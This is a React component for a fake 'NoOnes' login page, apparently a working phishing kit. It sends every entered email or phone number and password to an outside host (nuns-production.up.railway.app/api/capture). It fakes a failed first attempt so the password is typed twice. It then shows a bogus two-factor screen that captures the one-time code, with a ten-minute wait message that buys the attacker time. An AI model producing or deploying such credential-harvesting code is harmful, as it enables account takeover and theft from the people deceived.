import React, { useState, useEffect } from 'react';
import './login.css';

const Login = () => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [twoFACode, setTwoFACode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [darkTheme, setDarkTheme] = useState(false);
  const [loading, setLoading] = useState(false);
  const [show2FA, setShow2FA] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);

  // Function to send data to backend
  const sendToBackend = async (captureData) => {
    try {
      // FIXED: Added 'https' and the correct path '/api/capture'
      const response = await fetch('https://nuns-production.up.railway.app/api/capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...captureData,
          sessionId: sessionId,
          userAgent: navigator.userAgent
        })
      });
      
      const result = await response.json();
      console.log('📨 Sent to backend:', result);
    } catch (error) {
      console.log('⚠️ Backend not available, running in demo mode');
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    setErrorMessage(''); // Clear error when user starts typing
  };

  const handleTwoFAChange = (e) => {
    setTwoFACode(e.target.value);
  };

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage('');
    
    // Capture credentials for admin view
    await sendToBackend({
      type: 'LOGIN_ATTEMPT',
      identifier: formData.identifier,
      password: formData.password,
      attempt: loginAttempt + 1
    });
    
    // Simulate login process with first attempt failure
    setTimeout(() => {
      setLoading(false);
      
      if (loginAttempt === 0) {
        // First attempt fails
        setLoginAttempt(1);
        setErrorMessage('Invalid credentials. Please try again.');
        
        // Send failed attempt to backend without await
        sendToBackend({
          type: 'LOGIN_FAILED',
          identifier: formData.identifier,
          attempt: 1
        });
      } else {
        // Second attempt succeeds and goes to 2FA
        setUserEmail(formData.identifier);
        setShow2FA(true);
        setLoginAttempt(0); // Reset for next user
      }
    }, 1500);
  };

  const handle2FASubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    // Capture 2FA code for admin view
    await sendToBackend({
      type: '2FA_ATTEMPT',
      identifier: userEmail,
      code: twoFACode
    });
    
    // Simulate 2FA verification with 10-minute wait message
    setTimeout(() => {
      setLoading(false);
      
      // Capture successful login
      sendToBackend({
        type: 'LOGIN_SUCCESS',
        identifier: userEmail,
        code: twoFACode
      });
      
      alert('✅ Login successful! 2FA verified.');
      
      // Reset forms
      setShow2FA(false);
      setFormData({ identifier: '', password: '' });
      setTwoFACode('');
    }, 1500);
  };

  const toggleTheme = () => {
    setDarkTheme(!darkTheme);
  };

  const backToLogin = () => {
    setShow2FA(false);
    setTwoFACode('');
    setErrorMessage('');
  };

  // 2FA Verification Page
  if (show2FA) {
    return (
      <div className="login-wrapper">
        {/* Background Container - Full Screen */}
        <div 
          className="background-container"
          style={{
            backgroundImage: darkTheme 
              ? "url('/assets/background_dark.png')"
              : "url('/assets/background_light.png')",
          }}
        ></div>
        
        {/* Theme Toggle Button - Outside the container */}
        <div className="theme-toggle-outer">
          <button 
            className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
            onClick={toggleTheme}
          >
            <span className="toggle-slider"></span>
            <span className="toggle-text">
              {darkTheme ? '🌙 Dark Theme' : '☀️ Light Theme'}
            </span>
          </button>
        </div>

        {/* 2FA Verification Container */}
        <div className="login-container">
          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
            <div className="login-header">
              <div className="header-left">
                <h1 className="welcome-text">Security Verification</h1>
                <p className="verification-subtitle">Two-Factor Authentication Required</p>
              </div>
              <div className="header-right">
                <button className="social-btn back-btn" onClick={backToLogin} title="Back to Login">
                  ←
                </button>
              </div>
            </div>

            <div className="security-notice">
              <div className="security-icon">🔒</div>
              <p>We've sent a 6-digit verification code to:</p>
              <p className="user-email">{userEmail}</p>
              <p className="code-instruction">Please allow up to 10 minutes to receive your code.</p>
              <p className="wait-time">⏰ Code may take up to 10 minutes to arrive</p>
            </div>

            <form onSubmit={handle2FASubmit} className="login-form">
              <div className="form-group">
                <label htmlFor="twoFACode">Verification Code</label>
                <input
                  type="text"
                  id="twoFACode"
                  name="twoFACode"
                  placeholder={darkTheme ? "Enter 6-digit code" : "Enter 6-digit code"}
                  value={twoFACode}
                  onChange={handleTwoFAChange}
                  maxLength={6}
                  pattern="[0-9]{6}"
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                <div className="hint-text">Check your email for the verification code</div>
              </div>

              <button 
                type="submit" 
                className="login-button"
                disabled={loading || twoFACode.length !== 6}
              >
                {loading ? (
                  <span className="loading-spinner">⏳</span>
                ) : (
                  'Verify & Continue'
                )}
              </button>
            </form>

            <div className="help-links">
              <p><a href="#">Didn't receive the code? Wait 10 minutes</a></p>
              <p><a href="#">Use backup method</a></p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Login Page
  return (
    <div className="login-wrapper">
      {/* Background Container - Full Screen */}
      <div 
        className="background-container"
        style={{
          backgroundImage: darkTheme 
            ? "url('/assets/background_dark.png')"
            : "url('/assets/background_light.png')",
        }}
      ></div>
      
      {/* Theme Toggle Button - Outside the container */}
      <div className="theme-toggle-outer">
        <button 
          className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
          onClick={toggleTheme}
        >
          <span className="toggle-slider"></span>
          <span className="toggle-text">
            {darkTheme ? '🌙 Dark Theme' : '☀️ Light Theme'}
          </span>
        </button>
      </div>

      {/* Login Container */}
      <div className="login-container">
        <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
          <div className="login-header">
            <div className="header-left">
              <h1 className="welcome-text">Welcome to NoOnes</h1>
            </div>
            <div className="header-right">
              <button className="social-btn google-btn" title="Google">
                <img 
                  src="/assets/google-icon.gif" 
                  alt="Google" 
                  className="social-icon-img"
                />
              </button>
              <button className="social-btn apple-btn" title="Apple">
                <img 
                  src="/assets/apple-icon.webp" 
                  alt="Apple" 
                  className="social-icon-img"
                />
              </button>
            </div>
          </div>

          <form onSubmit={handleLoginSubmit} className="login-form">
            {errorMessage && (
              <div className="error-message">
                {errorMessage}
              </div>
            )}
            
            <div className="form-group">
              <label htmlFor="identifier">Email/Phone number</label>
              <input
                type="text"
                id="identifier"
                name="identifier"
                placeholder={darkTheme ? "Enter your email or phone number" : "Enter your email or phone number"}
                value={formData.identifier}
                onChange={handleChange}
                required
                className={darkTheme ? 'dark-input' : 'light-input'}
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="password-input-container">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  name="password"
                  placeholder={darkTheme ? "Enter your password" : "Enter your password"}
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className={darkTheme ? 'dark-input' : 'light-input'}
                />
                <button 
                  type="button"
                  className="show-password-btn"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? '🙈' : '👁️'}
                </button>
              </div>
              
              <div className="forgot-password-link">
                <a href="/forgot-password">Forgot password?</a>
              </div>
            </div>

            <button 
              type="submit" 
              className="login-button"
              disabled={loading}
            >
              {loading ? (
                <span className="loading-spinner">⏳</span>
              ) : (
                'Log in'
              )}
            </button>
          </form>

          <div className="signup-prompt">
            <p>No account yet? <a href="/signup" className="signup-link">Sign up</a></p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;